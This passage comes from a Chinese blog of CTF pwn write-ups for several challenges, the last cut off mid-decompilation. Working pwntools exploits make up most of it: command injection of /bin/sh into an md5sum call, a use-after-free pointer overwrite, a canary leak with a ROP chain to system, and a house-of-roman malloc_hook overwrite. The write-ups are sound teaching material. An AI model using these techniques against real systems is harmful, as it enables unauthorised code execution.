class="headerlink" title="分析"></a>分析</h2><p>给了几个函数，看了下没什么用，其中包括一个后门函数，但是限制两个字节且不能是sh，尝试vi提示没有安装，没有办法<br>checksec这边会执行几个指令，想办法绕过就好了，像web题一样</p><p>echo “” ; /bin/sh ; “”| md5sum  </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./filesystem&apos;)</span><br><span class="line">#sh = remote(&apos;101.71.29.5&apos;, 10017)</span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Create&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input Filename: &apos;)</span><br><span class="line">sh.sendline(&apos;aaaaa&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Edit&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input File Content: &apos;)</span><br><span class="line">sh.sendline(&apos;&quot;; /bin/sh ; &quot;&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Checksec&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>标准的选项题，有add print delete 功能</p><p>add 限制五次分配chunk，会先分配八个字节，分配用来存放一个print_moon_content函数指针及之后为用户分配的chunk指针，同时会在bss段存放为用户分配的chunk指针。<br>print 会检查输入的idx及bss段的指针，在指针存在的情况下，调用该指针处的函数，也就是之前存放的print_moon_content函数指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl print_moon_content(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(const char **)(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete 会将之前的两个指针依次free，但是其他的什么也没动，存在UAF问题</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>UAF漏洞很明显，同时指针被放到了堆中，很容易想到利用UAF控制指针即可，又同时，题中给了magic函数，所以想办法让magic函数指针覆盖某个chunk的指针就可以了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./hackmoon&apos;)</span><br><span class="line">elf = ELF(&apos;./hackmoon&apos;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;moon size :&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;Content :&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index, ):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Success\n&apos;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic= 0x8048986</span><br><span class="line">add(0x8,&apos;aaaaaaa&apos;)</span><br><span class="line">add(0x8,&apos;bbbbbbb&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x20,&apos;ccccccccc&apos;)</span><br><span class="line">add(0x8,&apos;deadbeef&apos;)</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x8,p32(magic)*2)</span><br><span class="line">show(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>护网杯pwn复现</title>
      <link href="/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h1 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表面是个堆题，但实际上是个栈溢出。。。</p><p>给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn guess()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST04_4</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-80h]</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-80h]</span><br><span class="line">  signed int i; // [rsp+0h] [rbp-80h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int rand; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int max_cnt; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char s[32]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  char s1; // [rsp+40h] [rbp-40h]</span><br><span class="line">  char name; // [rsp+60h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v12; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;please input your name&quot;);</span><br><span class="line">  read(0, &amp;name, 0x20uLL);</span><br><span class="line">  memset(s, 0, 0x10uLL);</span><br><span class="line">  puts(&quot;Do you want to guess the secret?&quot;);</span><br><span class="line">  get_str(&amp;v8, 2LL);</span><br><span class="line">  if ( v8 == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( access(&quot;/tmp/secret&quot;, 0) == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL);</span><br><span class="line">      fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">      read(fd, s, 0xCuLL);</span><br><span class="line">      LODWORD(v1) = 0;</span><br><span class="line">      while ( (signed int)v1 &lt;= 11 )</span><br><span class="line">      &#123;</span><br><span class="line">        s[(signed int)v1] &amp;= 1u;</span><br><span class="line">        LODWORD(v1) = v1 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, 0xCuLL);</span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v0 = open(&quot;/tmp/secret&quot;, 0, v1);</span><br><span class="line">    read(v0, s, 0xCuLL);</span><br><span class="line">    close(v0);</span><br><span class="line">    puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;);</span><br><span class="line">    max_cnt = input_0x10();</span><br><span class="line">    if ( max_cnt &gt; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;What? Why do you need to encrypt so many times?&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;At least encrypt one time&quot;, s);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513);</span><br><span class="line">    LODWORD(v2) = 0;</span><br><span class="line">    while ( (unsigned int)v2 &lt; max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, 16LL, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(SHIDWORD(v2), s, 0x10uLL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    puts(&quot;Try to guess the md5 of the secret&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(0, &amp;s1, 0x10uLL);</span><br><span class="line">    if ( !memcmp(&amp;s1, s, 0x10uLL) )</span><br><span class="line">      secret((__int64)&amp;name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2);</span><br><span class="line">    rand = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">    read(rand, s, 0xCuLL);</span><br><span class="line">    for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">      s[i] &amp;= 1u;</span><br><span class="line">    write(v4, s, 0xCuLL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(rand);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Oh!bye %s\n&quot;, &amp;name);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall secret(__int64 name)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // ST1B_1</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-214h]</span><br><span class="line">  char occ; // [rsp+20h] [rbp-210h]</span><br><span class="line">  char s; // [rsp+120h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+228h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Congratulations, %s guessed my secret!\n&quot;, name);</span><br><span class="line">  puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;);</span><br><span class="line">  puts(&quot;What`s your occupation?&quot;);</span><br><span class="line">  get_str(&amp;occ, 0xFFLL);</span><br><span class="line">  v3 = snprintf(</span><br><span class="line">         &amp;s,</span><br><span class="line">         0xFFuLL,</span><br><span class="line">         &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot;</span><br><span class="line">         &quot;.................................................................................................&quot;,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occ);</span><br><span class="line">  puts(&quot;Here is your introduce&quot;);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">    read(0, &amp;s, v3 - 1);</span><br><span class="line">  return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下保护，除了PIE其他的都开了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了：</p><p>程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。</p><p>而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。</p><p>因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。</p><p><em>ps： 但是感觉后面的栈布局有点奇怪，之后再看一看</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line"></span><br><span class="line">def six(name,rd,secret,flag=1):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; \n&apos;)</span><br><span class="line">    sh.sendline(&apos;666&apos;)</span><br><span class="line">    sh.recvuntil(&apos;name\n&apos;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&apos;secret?\n&apos;)</span><br><span class="line">    sh.sendline(&apos;y&apos;)</span><br><span class="line">    sh.recvuntil(&apos;secret:\n&apos;)</span><br><span class="line">    sh.sendline(str(rd))</span><br><span class="line">    if flag == 1:</span><br><span class="line">        sh.recvuntil(&apos;secret\n&apos;)</span><br><span class="line">        sh.send(secret)</span><br><span class="line"></span><br><span class="line">six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)</span><br><span class="line">sh.recvuntil(&apos;timeout~&apos;)</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x19)</span><br><span class="line">canary = u64(&apos;\x00&apos;+sh.recvn(7))</span><br><span class="line">print &apos;canary: &apos;+hex(canary)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)     </span><br><span class="line">sh.send(shellcode)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Congratulations, &apos;)</span><br><span class="line">libc_addr = u64(sh.recvn(6) + &apos;\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]</span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>选项题 add edit delete ，但是没有show函数</p><p>add 最多可以控制四个chunk，申请最大size为0x68</p><p>edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容</p><p>delete 只有free，存在UAF</p><p>程序在输入字符串时的get_str函数存在off-by-one漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; (signed int)i &lt;= len; ++i )      // off by one</span><br></pre></td></tr></table></figure><p>题目提示house of roman</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。</p><p>查看保护,全开（丧心病狂）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命)</p><p>house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能<br>其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。</p><p><em>ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell .</em></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./task_calendar&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,info):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(size))</span><br><span class="line">sh.sendafter(&apos;&gt;&apos;,info)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">sh.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">add(1,0x68)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x68)</span><br><span class="line"></span><br><span class="line">#------make chunk2 free to unsorted bin----------</span><br><span class="line"></span><br><span class="line">edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x91&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----fastbin attack-----------------------------</span><br><span class="line"></span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+&apos;\x71&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,&apos;\x70\x70&apos;)</span><br><span class="line">edit(2,1,&apos;\xfd\x1a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13-----</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line"></span><br><span class="line"># fix fastbinY---------</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#----unsorted bin attack-------------------------</span><br><span class="line"></span><br><span class="line">add(1,0x60)</span><br><span class="line">edit(1,9,p64(0)+&apos;\x00\x1b&apos;)</span><br><span class="line">add(1,0x60)</span><br><span class="line"></span><br><span class="line">#----edit malloc_hook to one_gadget--------------</span><br><span class="line"></span><br><span class="line">one_off = 0xf66f0</span><br><span class="line">edit(3,5,&apos;aaa\xa4\xd2\xaf&apos;)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">sh = process(&apos;./task_calendar&apos;)</span><br><span class="line">try:</span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">break;</span><br><span class="line">except:</span><br><span class="line">print i</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="six"><a href="#six" class="headerlink" title="six"></a>six</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一道感觉很奇怪的题目，不容易看懂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  void (__fastcall *v3)(__int64, char *); // ST08_8</span><br><span class="line">  size_t v4; // rax</span><br><span class="line">  char *v5; // rbx</span><br><span class="line">  size_t v6; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+18h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  mmap2chunk();</span><br><span class="line">  </span><br><span class="line">  `</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 6uLL);</span><br><span class="line">  read(fd, &amp;v3, 6uLL);</span><br><span class="line">  dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL);       --》rwx 高地址</span><br><span class="line">  qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 